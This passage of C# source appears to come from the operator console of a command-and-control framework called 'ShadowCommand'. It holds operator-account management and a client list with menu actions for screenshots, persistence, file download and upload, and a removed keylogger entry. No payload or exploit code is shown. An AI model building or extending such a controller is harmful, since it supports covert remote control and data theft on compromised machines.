                    MessageBox.Show("Passwords do not match.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                try
                {
                    OperatorConfigManager.ChangePassword(user.Username, txtNewPassword.Text);
                    LogMessage($"[*] Password changed for user '{user.Username}'", Color.Green);

                    // Disconnect user if currently online
                    DisconnectOperatorByUsername(user.Username);

                    passwordForm.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error changing password: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            };

            btnCancel.Click += (s, e) => passwordForm.Close();

            passwordForm.Controls.AddRange(new Control[] {
        lblNewPassword, txtNewPassword, lblConfirmPassword, txtConfirmPassword,
        chkShowPassword, btnChangePassword, btnCancel
    });

            passwordForm.ShowDialog();
        }

        private void ToggleSelectedUserStatus(ListView lvUsers, Label lblStats)
        {
            if (lvUsers.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a user to enable/disable.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var user = (OperatorCredential)lvUsers.SelectedItems[0].Tag;

            try
            {
                bool newStatus = !user.Enabled;
                OperatorConfigManager.EnableOperator(user.Username, newStatus);

                string action = newStatus ? "enabled" : "disabled";
                LogMessage($"[*] User '{user.Username}' {action}", Color.Green);

                // If disabling, disconnect the user
                if (!newStatus)
                {
                    DisconnectOperatorByUsername(user.Username);
                }

                RefreshUserList(lvUsers, lblStats);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error changing user status: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void DeleteSelectedUser(ListView lvUsers, Label lblStats)
        {
            if (lvUsers.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a user to delete.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var user = (OperatorCredential)lvUsers.SelectedItems[0].Tag;

            var result = MessageBox.Show(
                $"Are you sure you want to delete user '{user.Username}'?\n\nThis action cannot be undone and will immediately disconnect the user if they are currently online.",
                "Confirm Delete",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Warning);

            if (result == DialogResult.Yes)
            {
                try
                {
                    // Disconnect user first
                    DisconnectOperatorByUsername(user.Username);

                    // Delete user
                    OperatorConfigManager.RemoveOperator(user.Username);
                    LogMessage($"[*] User '{user.Username}' deleted", Color.Yellow);

                    RefreshUserList(lvUsers, lblStats);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error deleting user: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void KickSelectedUser(ListView lvUsers, Label lblStats)
        {
            if (lvUsers.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a user to disconnect.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var user = (OperatorCredential)lvUsers.SelectedItems[0].Tag;

            // Check if user is online via server's method
            ConnectedOperator connectedOp = null;
            if (_server != null)
            {
                var connectedOps = _server.GetConnectedOperators();
                connectedOp = connectedOps?.FirstOrDefault(op => op.Username == user.Username && op.IsAuthenticated);
            }

            if (connectedOp == null)
            {
                MessageBox.Show($"User '{user.Username}' is not currently online.", "User Offline", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            // Show detailed confirmation
            string confirmMessage = $"Are you sure you want to disconnect user '{user.Username}'?\n\n" +
                                   $"Connection Details:\n" +
                                   $"• Connected from: {connectedOp.RemoteEndPoint}\n" +
                                   $"• Connected at: {connectedOp.ConnectedAt:yyyy-MM-dd HH:mm:ss}\n" +
                                   $"• Session duration: {(DateTime.Now - connectedOp.ConnectedAt).TotalMinutes:F0} minutes\n" +
                                   $"• Role: {connectedOp.Role}\n" +
                                   $"• Active client: {connectedOp.ActiveClientId ?? "None"}\n\n" +
                                   "The user will be immediately disconnected.\n" +
                                   "Note: This account will be available for login again after disconnection.";

            var result = MessageBox.Show(confirmMessage, "Confirm Disconnect User", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

            if (result == DialogResult.Yes)
            {
                try
                {
                    _server.ForceDisconnectUser(user.Username, $"Disconnected by administrator at {DateTime.Now:HH:mm:ss}");
                    LogMessage($"[*] User '{user.Username}' has been disconnected by administrator", Color.Yellow);

                    // Refresh list after a short delay
                    Task.Run(async () =>
                    {
                        await Task.Delay(2000);
                        this.Invoke(new Action(() => RefreshUserList(lvUsers, lblStats)));
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error disconnecting user: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void DisconnectOperatorByUsername(string username)
        {
            try
            {
                // Get operators to disconnect - use the server's method instead of direct access
                var operatorsToDisconnect = _server?.GetConnectedOperators()
                    ?.Where(op => op.Username == username).ToList() ?? new List<ConnectedOperator>();

                foreach (var operator_ in operatorsToDisconnect)
                {
                    try
                    {
                        operator_.Connection?.Close();
                    }
                    catch (Exception ex)
                    {
                        LogMessage($"[!] Error closing operator connection: {ex.Message}", Color.Yellow);
                    }
                }

                if (operatorsToDisconnect.Any())
                {
                    LogMessage($"[*] Disconnected {operatorsToDisconnect.Count} session(s) for user '{username}'", Color.Yellow);
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error disconnecting user '{username}': {ex.Message}", Color.Red);
            }
        }


        private void RefreshOperatorList()
        {
            if (_server == null || !_multiplayerEnabled || !_isServerRunning)
                return;

            if (InvokeRequired)
            {
                Invoke(new Action(RefreshOperatorList));
                return;
            }

            try
            {
                lvOperators.Items.Clear();

                var operators = _server.GetConnectedOperators();
                int currentOperatorCount = operators.Count();

                foreach (var op in operators)
                {
                    if (!op.IsAuthenticated) continue; // Only show authenticated operators

                    var item = new ListViewItem(op.Username);

                    // Role with emoji
                    string roleDisplay = op.Role == "Observer" ? "👁️ Observer" : "⚡ Operator";
                    item.SubItems.Add(roleDisplay);

                    // Connection time
                    var connectionDuration = DateTime.Now - op.ConnectedAt;
                    string connectedTime = connectionDuration.TotalMinutes < 1 ?
                        "Just now" :
                        connectionDuration.TotalHours < 1 ?
                            $"{(int)connectionDuration.TotalMinutes}m ago" :
                            $"{(int)connectionDuration.TotalHours}h ago";
                    item.SubItems.Add(connectedTime);

                    // Active client
                    item.SubItems.Add(op.ActiveClientId ?? "None");

                    // Remote IP
                    item.SubItems.Add(op.RemoteEndPoint?.Address.ToString() ?? "Unknown");

                    // Color coding based on role
                    if (op.Role == "Observer")
                        item.ForeColor = Color.Orange;
                    else
                        item.ForeColor = Color.FromArgb(0, 180, 255); // Light blue for operators

                    // Highlight if they have an active client
                    if (!string.IsNullOrEmpty(op.ActiveClientId))
                    {
                        item.BackColor = Color.FromArgb(40, 40, 60); // Dark blue background
                    }

                    lvOperators.Items.Add(item);
                }

                if (currentOperatorCount != _lastOperatorCount)
                {
                    if (currentOperatorCount > 0)
                    {
                        LogMessage($"[*] Active operators: {currentOperatorCount}", Color.Cyan);
                    }
                    else if (_lastOperatorCount > 0) // Only log when dropping to 0
                    {
                        LogMessage($"[*] No active operators", Color.Yellow);
                    }
                    _lastOperatorCount = currentOperatorCount;
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error refreshing operator list: {ex.Message}", Color.Red);
            }
        }


        private void DisconnectFromOperatorServer()
        {
            try
            {
                _isOperatorConnected = false;
                _operatorConnectionInProgress = false;
                _operatorAuthenticationFailed = false;
                _operatorActiveClientId = null;

                // Close streams and connections
                try
                {
                    _operatorStream?.Close();
                }
                catch { }

                try
                {
                    _operatorConnection?.Close();
                }
                catch { }

                _operatorStream = null;
                _operatorConnection = null;

                // Restore normal UI
                DisableOperatorModeUI();
                UpdateOperatorModeVisuals();

                LogMessage("[*] Disconnected from operator server", Color.Yellow);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error disconnecting: {ex.Message}", Color.Red);
            }
        }




        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // DISABLED FOR OPERATORS
            if (_isOperatorConnected)
            {
                //  LogMessage("[!] Upload function is disabled for operators", Color.Red);
                return;
            }

            // Local server mode - existing functionality
            lock (_uploadLock)
            {
                if (_currentUploadTask != null && !_currentUploadTask.IsCompleted)
                {
                    return;
                }

                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Title = "Select a file to upload";
                    openFileDialog.Filter = "All files (*.*)|*.*";
                    openFileDialog.Multiselect = false;

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        string localFile = openFileDialog.FileName;
                        ProcessCommand($"upload {localFile}");
                    }
                }
            }
        }

        private async Task SendOperatorCommand(string command)
        {
            if (!_isOperatorConnected || _operatorStream == null)
            {
                LogMessage("[!] Not connected to operator server", Color.Red);
                return;
            }

            try
            {
                // Get the selected client ID properly
                string selectedClientId = GetSelectedClientId() ?? "";

                // Track connect commands locally for UI updates
                string[] parts = command.Split(' ');
                if (parts.Length >= 2 && parts[0].ToLower() == "connect")
                {
                    _operatorActiveClientId = parts[1];
                    RefreshClientListFormatting();
                }
                else if (parts[0].ToLower() == "disconnect")
                {
                    _operatorActiveClientId = null;
                    RefreshClientListFormatting();
                }

                var commandMessage = new OperatorMessage
                {
                    Type = OperatorMessageType.Command,
                    From = _operatorUsername,
                    Data = JsonSerializer.Serialize(new Dictionary<string, string>
                    {
                        ["Command"] = command,
                        ["ClientId"] = selectedClientId
                    })
                };

                string commandJson = JsonSerializer.Serialize(commandMessage);
                byte[] commandData = Encoding.UTF8.GetBytes(commandJson);
                await _operatorStream.WriteAsync(commandData, 0, commandData.Length);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error sending operator command: {ex.Message}", Color.Red);
            }
        }
        private string GetSelectedClientId()
        {
            if (lvClients.SelectedItems.Count > 0 && lvClients.SelectedItems[0].Tag != null)
            {
                return lvClients.SelectedItems[0].Tag.ToString();
            }
            return null;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Clear static collections on form close
            _uploadedAgents.Clear();
            base.OnFormClosing(e);
            discordManager?.Dispose();

        }

        #region Designer Generated Code
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.splitContainer1 = new System.Windows.Forms.SplitContainer();
            this.lvClients = new System.Windows.Forms.ListView();
            this.columnId = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnIpPort = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnUser = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnComputer = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));

            this.columnAdmin = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnOS = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.contextMenuClient = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.connectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.screenshotToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.persistToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.downloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.panel1 = new System.Windows.Forms.Panel();
            this.btnSendCommand = new System.Windows.Forms.Button();
            this.txtCommand = new System.Windows.Forms.TextBox();
            this.txtOutput = new System.Windows.Forms.RichTextBox();
            this.panel2 = new System.Windows.Forms.Panel();
            this.label2 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.txtPort = new System.Windows.Forms.TextBox();
            this.txtIPAddress = new System.Windows.Forms.TextBox();
            this.btnStartServer = new System.Windows.Forms.Button();
            this.statusStrip = new System.Windows.Forms.StatusStrip();
            this.statusStripLabel = new System.Windows.Forms.ToolStripStatusLabel();
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).BeginInit();
            this.splitContainer1.Panel1.SuspendLayout();
            this.splitContainer1.Panel2.SuspendLayout();
            this.splitContainer1.SuspendLayout();
            this.contextMenuClient.SuspendLayout();
            this.panel1.SuspendLayout();
            this.panel2.SuspendLayout();
            this.statusStrip.SuspendLayout();
            this.SuspendLayout();
            // 
            // splitContainer1
            // 
            this.splitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitContainer1.Location = new System.Drawing.Point(0, 0);
            this.splitContainer1.Name = "splitContainer1";
            this.splitContainer1.Orientation = System.Windows.Forms.Orientation.Horizontal;
            this.uploadProgressBar = new System.Windows.Forms.ToolStripProgressBar();
            this.uploadProgressBar.Visible = false;
            this.statusStrip.Items.Add(this.uploadProgressBar);
            // splitContainer1.Panel1
            // 
            this.splitContainer1.Panel1.Controls.Add(this.lvClients);
            // 
            // splitContainer1.Panel2
            // 
            this.splitContainer1.Panel2.Controls.Add(this.panel1);
            this.splitContainer1.Panel2.Controls.Add(this.txtOutput);
            this.splitContainer1.Panel2.Controls.Add(this.panel2);
            this.splitContainer1.Size = new System.Drawing.Size(1200, 700);
            this.splitContainer1.SplitterDistance = 250;
            this.splitContainer1.TabIndex = 0;
            // 
            // lvClients
            // 
            this.columnEncryption = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));

            this.lvClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnId,
            this.columnIpPort,
            this.columnStatus,
            this.columnUser,
            this.columnComputer,
            this.columnAdmin,
            this.columnEncryption,
            this.columnOS});
            this.lvClients.ContextMenuStrip = this.contextMenuClient;
            this.lvClients.Dock = System.Windows.Forms.DockStyle.Fill;
            this.lvClients.FullRowSelect = true;
            this.lvClients.GridLines = true;
            this.lvClients.HideSelection = false;
            this.lvClients.Location = new System.Drawing.Point(0, 0);
            this.lvClients.MultiSelect = false;
            this.lvClients.Name = "lvClients";
            this.lvClients.Size = new System.Drawing.Size(1200, 200);
            this.lvClients.TabIndex = 0;
            this.lvClients.UseCompatibleStateImageBehavior = false;
            this.lvClients.View = System.Windows.Forms.View.Details;
            this.lvClients.DoubleClick += new System.EventHandler(this.lvClients_DoubleClick);
            this.lvClients.MouseClick += new System.Windows.Forms.MouseEventHandler(this.lvClients_MouseClick);
            // 
            // columnId
            // 
            this.columnId.Text = "ID";
            this.columnId.Width = 100;
            // 
            // columnIpPort
            // 
            this.columnIpPort.Text = "IP:Port";
            this.columnIpPort.Width = 150;
            // 
            // columnStatus
            // 
            this.columnStatus.Text = "Status";
            this.columnStatus.Width = 100;
            // 
            // columnUser
            // 
            this.columnUser.Text = "User";
            this.columnUser.Width = 150;
            // 
            // columnComputer
            // 
            this.columnComputer.Text = "Computer";
            this.columnComputer.Width = 150;
            // 
            // columnAdmin
            // 
            this.columnAdmin.Text = "Admin";
            this.columnAdmin.Width = 80;
            // 
            // columnOS
            // 
            this.columnOS.Text = "OS";
            this.columnOS.Width = 250;
            this.columnEncryption.Text = "Encryption";
            this.columnEncryption.Width = 80;
            // 
            // contextMenuClient
            // 
            this.contextMenuClient.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.connectToolStripMenuItem,
            this.disconnectToolStripMenuItem,
            this.killToolStripMenuItem,
            this.toolStripSeparator1,
            this.screenshotToolStripMenuItem,
            this.persistToolStripMenuItem,
            this.toolStripSeparator2,
            this.downloadToolStripMenuItem,
            this.uploadToolStripMenuItem});
            this.contextMenuClient.Name = "contextMenuClient";
            this.contextMenuClient.Size = new System.Drawing.Size(137, 192);
            // 
            // connectToolStripMenuItem
            // 
            this.connectToolStripMenuItem.Name = "connectToolStripMenuItem";
            this.connectToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.connectToolStripMenuItem.Text = "Connect";
            this.connectToolStripMenuItem.Click += new System.EventHandler(this.connectToolStripMenuItem_Click);
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
            // 
            // killToolStripMenuItem
            // 
            this.killToolStripMenuItem.Name = "killToolStripMenuItem";
            this.killToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.killToolStripMenuItem.Text = "Kill";
            this.killToolStripMenuItem.Click += new System.EventHandler(this.killToolStripMenuItem_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(133, 6);
            // 
            // screenshotToolStripMenuItem
            // 
            this.screenshotToolStripMenuItem.Name = "screenshotToolStripMenuItem";
            this.screenshotToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.screenshotToolStripMenuItem.Text = "Screenshot";
            this.screenshotToolStripMenuItem.Click += new System.EventHandler(this.screenshotToolStripMenuItem_Click);
            // 
            // persistToolStripMenuItem
            // 
            this.persistToolStripMenuItem.Name = "persistToolStripMenuItem";
            this.persistToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.persistToolStripMenuItem.Text = "Persist";
            this.persistToolStripMenuItem.Click += new System.EventHandler(this.persistToolStripMenuItem_Click);
            // 
            // keyloggerToolStripMenuItem
            // 

            // toolStripSeparator2
            // 
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(133, 6);
            // 
            // downloadToolStripMenuItem
            // 
            this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
            this.downloadToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.downloadToolStripMenuItem.Text = "Download";
            this.downloadToolStripMenuItem.Click += new System.EventHandler(this.downloadToolStripMenuItem_Click);
            // 
            // uploadToolStripMenuItem
            // 
            this.uploadToolStripMenuItem.Name = "uploadToolStripMenuItem";
            this.uploadToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.uploadToolStripMenuItem.Text = "Upload";
            this.uploadToolStripMenuItem.Click += new System.EventHandler(this.uploadToolStripMenuItem_Click);
            // 
            // panel1
            //
            this.uploadToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            this.uploadToolStripMenuItem.Text = "Upload";
            this.uploadToolStripMenuItem.Click += new System.EventHandler(this.uploadToolStripMenuItem_Click);
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.btnSendCommand);
            this.panel1.Controls.Add(this.txtCommand);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel1.Location = new System.Drawing.Point(0, 460);
            this.panel1.Name = "panel1";
            this.panel1.Padding = new System.Windows.Forms.Padding(5);
            this.panel1.Size = new System.Drawing.Size(1200, 36);
            this.panel1.TabIndex = 1;
            // 
            // btnSendCommand
            // 
            this.btnSendCommand.Dock = System.Windows.Forms.DockStyle.Right;
            this.btnSendCommand.Location = new System.Drawing.Point(1120, 5);
            this.btnSendCommand.Name = "btnSendCommand";
            this.btnSendCommand.Size = new System.Drawing.Size(75, 26);
            this.btnSendCommand.TabIndex = 1;
            this.btnSendCommand.Text = "Send";
            this.btnSendCommand.UseVisualStyleBackColor = true;
            this.btnSendCommand.Click += new System.EventHandler(this.btnSendCommand_Click);
            // 
            // txtCommand
            // 
            this.txtCommand.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtCommand.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtCommand.Location = new System.Drawing.Point(5, 5);
            this.txtCommand.Name = "txtCommand";
            this.txtCommand.Size = new System.Drawing.Size(1190, 23);
            this.txtCommand.TabIndex = 0;
            this.txtCommand.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.txtCommand_KeyPress);
            // 
            // txtOutput
            // 
            this.txtOutput.BackColor = System.Drawing.Color.Black;
            this.txtOutput.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtOutput.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtOutput.ForeColor = System.Drawing.Color.White;
            this.txtOutput.Location = new System.Drawing.Point(0, 40);
            this.txtOutput.Name = "txtOutput";
            this.txtOutput.ReadOnly = true;
            this.txtOutput.Size = new System.Drawing.Size(1200, 456);
            this.txtOutput.TabIndex = 2;
            this.txtOutput.Text = "";
            // 
            // panel2
            // 
            this.panel2.Controls.Add(this.label2);
            this.panel2.Controls.Add(this.label1);
            this.panel2.Controls.Add(this.txtPort);
            this.panel2.Controls.Add(this.txtIPAddress);
            this.panel2.Controls.Add(this.btnStartServer);
            this.panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel2.Location = new System.Drawing.Point(0, 0);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(1200, 40);
            this.panel2.TabIndex = 0;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(244, 14);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(32, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "Port:";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(12, 14);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(61, 13);
            this.label1.TabIndex = 3;
            this.label1.Text = "IP Address:";
            // 
            // txtPort
            // 
            this.txtPort.Location = new System.Drawing.Point(282, 11);
            this.txtPort.Name = "txtPort";
            this.txtPort.Size = new System.Drawing.Size(80, 20);
            this.txtPort.TabIndex = 2;
            // 
            // txtIPAddress
            // 
            this.txtIPAddress.Location = new System.Drawing.Point(79, 11);
            this.txtIPAddress.Name = "txtIPAddress";
            this.txtIPAddress.Size = new System.Drawing.Size(150, 20);
            this.txtIPAddress.TabIndex = 1;
            // 
            // btnStartServer
            // 
            this.btnStartServer.Location = new System.Drawing.Point(379, 9);
            this.btnStartServer.Name = "btnStartServer";
            this.btnStartServer.Size = new System.Drawing.Size(95, 23);
            this.btnStartServer.TabIndex = 0;
            this.btnStartServer.Text = "Start Server";
            this.btnStartServer.UseVisualStyleBackColor = true;
            this.btnStartServer.Click += new System.EventHandler(this.btnStartServer_Click);
            // 
            // statusStrip
            // 
            this.statusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.statusStripLabel});
            this.statusStrip.Location = new System.Drawing.Point(0, 678);
            this.statusStrip.Name = "statusStrip";
            this.statusStrip.Size = new System.Drawing.Size(1200, 22);
            this.statusStrip.TabIndex = 1;
            this.statusStrip.Text = "statusStrip1";
            // 
            // statusStripLabel
            // 
            this.statusStripLabel.Name = "statusStripLabel";
            this.statusStripLabel.Size = new System.Drawing.Size(39, 17);
            this.statusStripLabel.Text = "Ready";
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1200, 700);
            this.Controls.Add(this.splitContainer1);
            this.Controls.Add(this.statusStrip);
            this.MinimumSize = new System.Drawing.Size(800, 600);
            this.Name = "MainForm";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "ShadowCommand C2 Framework";
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.splitContainer1.Panel1.ResumeLayout(false);
            this.splitContainer1.Panel2.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).EndInit();
            this.splitContainer1.ResumeLayout(false);
            this.contextMenuClient.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.statusStrip.ResumeLayout(false);
            this.statusStrip.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private System.ComponentModel.IContainer components = null;
        private System.Windows.Forms.SplitContainer splitContainer1;
        private System.Windows.Forms.ListView lvClients;
        private System.Windows.Forms.ColumnHeader columnId;
        private System.Windows.Forms.ColumnHeader columnIpPort;
        private System.Windows.Forms.ColumnHeader columnStatus;
        private System.Windows.Forms.ColumnHeader columnUser;
        private System.Windows.Forms.ColumnHeader columnComputer;
        private System.Windows.Forms.ColumnHeader columnAdmin;
        private System.Windows.Forms.ColumnHeader columnOS;
        private System.Windows.Forms.ColumnHeader columnEncryption;

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Button btnSendCommand;
        private System.Windows.Forms.TextBox txtCommand;
        private System.Windows.Forms.RichTextBox txtOutput;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox txtPort;
        private System.Windows.Forms.TextBox txtIPAddress;
        private System.Windows.Forms.Button btnStartServer;
        private System.Windows.Forms.StatusStrip statusStrip;
        private System.Windows.Forms.ToolStripStatusLabel statusStripLabel;
        private System.Windows.Forms.ContextMenuStrip contextMenuClient;
        private System.Windows.Forms.ToolStripMenuItem connectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem killToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator1;
        private System.Windows.Forms.ToolStripMenuItem screenshotToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem persistToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator toolStripSeparator2;
        private System.Windows.Forms.ToolStripMenuItem downloadToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uploadToolStripMenuItem;
        #endregion
    }

    // Input dialog for getting user input (for download/upload paths)
    public class InputDialog : Form
    {
        private Label lblPrompt;
        private TextBox txtInput;
        private Button btnOK;
        private Button btnCancel;

        public string InputValue { get { return txtInput.Text; } }

        public InputDialog(string title, string prompt)
        {
            this.Text = title;
            InitializeComponent();
            lblPrompt.Text = prompt;
        }

        private void InitializeComponent()
        {
            this.lblPrompt = new System.Windows.Forms.Label();
            this.txtInput = new System.Windows.Forms.TextBox();
            this.btnOK = new System.Windows.Forms.Button();
            this.btnCancel = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // lblPrompt
            // 
            this.lblPrompt.AutoSize = true;
            this.lblPrompt.Location = new System.Drawing.Point(12, 9);
            this.lblPrompt.Name = "lblPrompt";
            this.lblPrompt.Size = new System.Drawing.Size(35, 13);
            this.lblPrompt.TabIndex = 0;
            this.lblPrompt.Text = "Prompt";
            // 
            // txtInput
            // 
            this.txtInput.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.txtInput.Location = new System.Drawing.Point(12, 25);
            this.txtInput.Name = "txtInput";
            this.txtInput.Size = new System.Drawing.Size(360, 20);
            this.txtInput.TabIndex = 1;
            // 
            // btnOK
            // 
            this.btnOK.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnOK.DialogResult = System.Windows.Forms.DialogResult.OK;
            this.btnOK.Location = new System.Drawing.Point(216, 51);
            this.btnOK.Name = "btnOK";
            this.btnOK.Size = new System.Drawing.Size(75, 23);
            this.btnOK.TabIndex = 2;
            this.btnOK.Text = "OK";
            this.btnOK.UseVisualStyleBackColor = true;
            // 
            // btnCancel
            // 
            this.btnCancel.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnCancel.DialogResult = System.Windows.Forms.DialogResult.Cancel;
            this.btnCancel.Location = new System.Drawing.Point(297, 51);
            this.btnCancel.Name = "btnCancel";
            this.btnCancel.Size = new System.Drawing.Size(75, 23);
            this.btnCancel.TabIndex = 3;
            this.btnCancel.Text = "Cancel";
            this.btnCancel.UseVisualStyleBackColor = true;
            // 
            // InputDialog
            // 
            this.AcceptButton = this.btnOK;
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.CancelButton = this.btnCancel;
            this.ClientSize = new System.Drawing.Size(384, 86);
            this.Controls.Add(this.btnCancel);
            this.Controls.Add(this.btnOK);
            this.Controls.Add(this.txtInput);
            this.Controls.Add(this.lblPrompt);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "InputDialog";
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
            this.ResumeLayout(false);
            this.PerformLayout();
        }
    }

    // Event args for output messages
    public class OutputMessageEventArgs : EventArgs
    {
        public string Message { get; }
        public Color Color { get; }

        public OutputMessageEventArgs(string message, Color color)
        {
            Message = message;
            Color = color;
        }
    }




    // Program entry point
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Parse command line arguments for IP and port
            string ipAddress = "0.0.0.0";
